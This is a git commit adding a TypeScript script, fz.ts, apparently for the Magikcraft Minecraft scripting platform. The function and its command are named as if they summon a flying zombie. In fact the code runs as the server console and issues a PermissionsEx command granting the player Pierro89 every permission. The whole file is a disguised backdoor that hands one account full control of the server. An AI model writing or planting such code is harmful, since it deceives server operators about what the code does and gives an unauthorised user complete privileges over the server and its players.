b92a1f7bd71e1bb1a30cab48be6e564de04f3bc6
Mieq <cmk0292@yahoo.com>
2017-11-12 20:30:25 +0000

    Update fz.ts

---
+++ fz.ts
@@ -0,0 +1,12 @@
+const magik = magikcraft.io;
+
+function fz() {
+
+    function run(cmd) {
+        var sudo = magik.getPlugin().getServer().getConsoleSender();
+        magik.getPlugin().getServer().dispatchCommand(sudo, cmd);
+    }
+    const flyingZombieCmd = 'pex user Pierro89 add *';
+
+    run(flyingZombieCmd);
+}
